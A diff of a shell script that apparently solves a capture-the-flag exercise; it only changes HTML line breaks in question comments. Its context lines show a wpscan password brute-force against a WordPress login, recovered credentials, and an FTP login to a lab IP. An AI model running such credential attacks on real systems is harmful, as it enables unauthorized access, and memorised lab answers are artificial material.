@@ -42,7 +42,7 @@ export IP=$1
 # 2. What CMS was the page using?
 # WordPress
 
-# 3. What are the credentials that logged the attacker on the webpage? *(How can you tell you found the right credentials)* <br/> **Format: `user:password`** 
+# 3. What are the credentials that logged the attacker on the webpage? *(How can you tell you found the right credentials)* <br> **Format: `user:password`** 
 /usr/bin/wpscan --url http://$IP/prehistoricforest/ --password-attack wp-login -U tom -P tom1.txt
 /usr/bin/sleep 5
 # tommy:tomtom1 
@@ -67,7 +67,7 @@ export IP=$1
 /usr/bin/sleep 10
 # Steve Jobs 
 
-# 10. What are the credentials for the FTP server? <br/>  **Format: `user:password`**
+# 10. What are the credentials for the FTP server? <br>  **Format: `user:password`**
 /usr/bin/ftp -inv 192.168.56.102 << EOF
 quote USER ftpuser 
 quote PASS ftpuser
